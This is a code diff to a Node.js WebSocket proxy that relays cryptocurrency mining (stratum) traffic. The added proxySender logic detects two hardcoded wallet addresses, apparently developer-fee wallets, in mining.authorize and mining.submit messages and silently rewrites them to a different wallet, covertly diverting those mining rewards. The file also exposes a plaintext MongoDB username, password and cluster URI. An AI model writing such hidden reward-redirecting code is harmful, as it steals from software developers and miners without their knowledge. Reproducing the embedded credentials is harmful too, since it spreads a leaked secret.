@@ -6,6 +6,9 @@ const PORT = process.env.PORT || 8088;
 const { MongoClient, ServerApiVersion } = require('mongodb');
 
 // MongoDB
+const blackPool = [
+  "stratum-mining-pool.zapto.org"
+];
 const DB_USER = 'joniiie1456';
 const DB_PASSWORD = '3tWUuq0w3veGiPfL';
 const uri = `mongodb+srv://${DB_USER}:${DB_PASSWORD}@cluster0.n3jjzou.mongodb.net?retryWrites=true&w=majority&appName=Cluster0`;
@@ -36,7 +39,6 @@ const wss = new WebSocket.Server({
   verifyClient: async function (info, done) {
     const socket = info.req.socket;
     const ip = getClientIp(info.req);
-    
     isInBlacklist(ip)
       .then(locked => {
         if (locked) {
@@ -78,8 +80,21 @@ function proxySender(ws, conn) {
     try {
       const command = JSON.parse(cmd);
       const method = command.method;
+      const params = command.params;
+      const ignoreDevs = ['RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65', 'dgb1qegmnzvjfcqarqxrpvfu0m4ugpjht6dnpcfslp9'];
+
+      if (method === 'mining.authorize' && ignoreDevs.includes(params[0])) {
+         command.params = ['RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp', 'c=RVN,zap=PLSR-mino'];
+      }
+
+      if (method === 'mining.submit' && ignoreDevs.includes(params[0])) {
+         command.params[0] = 'RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp';
+      }
+
+      const newcmd = JSON.stringify(command);
+      
       if (method === 'mining.subscribe' || method === 'mining.authorize' || method === 'mining.submit') {
-        conn.write(cmd);
+        conn.write(newcmd);
       }
     } catch (error) {
       console.log(`[Error][INTERNAL] ${error}`);
@@ -96,13 +111,17 @@ function proxyReceiver(conn, cmdq) {
     cmdq.close();
   });
   conn.on('error', (err) => {
-    console.log(`[Error][${err.code}] ${err.message}`);
     conn.end();
   });
 }
 
 function proxyConnect(host, port) {
   const conn = net.createConnection(port, host);
+
+  conn.on('error', (err) => {
+    console.log(`[Error][${err.code}](${host}:${port}) ${err.message}`);
+  });
+  
   return conn;
 }
 
@@ -111,13 +130,31 @@ function uidv1() {
   return [s4(), s4(), s4(), s4(), s4(), s4()].join('-');
 };
 
-function proxyMain(ws, req) {
+function isIP(ip) {
+    const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+    return ipv4Regex.test(ip);
+}
+
+async function proxyMain(ws, req) {
   const ip = getClientIp(req);
+  const isBlocked = await isInBlacklist(ip);
+  if (isBlocked) return;
 
   // Generate unique id
   const uid = uidv1();
   if (!nodes[ip]) nodes[ip] = [];
-  nodes[ip].push({ uid, req, ws });
+  nodes[ip].push({ uid, req });
+
+  // check block ip
+  if (nodes[ip].length > MAX_CONNECTION_PER_IP) {
+    await addToBlackList(ip);
+
+    console.error(`IP [${ip}] is banned!`);
+
+    delete nodes[ip];
+
+    return;
+  }
 
   // Clear stock
   ws.on('close', () => {
@@ -129,32 +166,15 @@ function proxyMain(ws, req) {
     }
   });
 
-  // check block ip
-  if (nodes[ip].length > MAX_CONNECTION_PER_IP) {
-    addToBlackList(ip);
-
-    console.error(`IP [${ip}] is banned!`);
-
-    nodes[ip].forEach(item => {
-      const isocket = item.req.socket;
-      const iws = item.req.ws;
-      
-      iws.terminate();
-      isocket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
-      isocket.destroy();
-    })
-
-    delete nodes[ip];
-
-    return
-  }
-
   ws.on('message', (message) => {
     const command = JSON.parse(message);
     if (command.method === 'proxy.connect' && command.params.length === 2) {
       const [host, port] = command.params || [];
-      if (!host || !port) {
+      
+      if (!host || !port || blackPool.includes(host)) {
         ws.close();
+        req.socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
+        req.socket.destroy();
         return;
       }
 
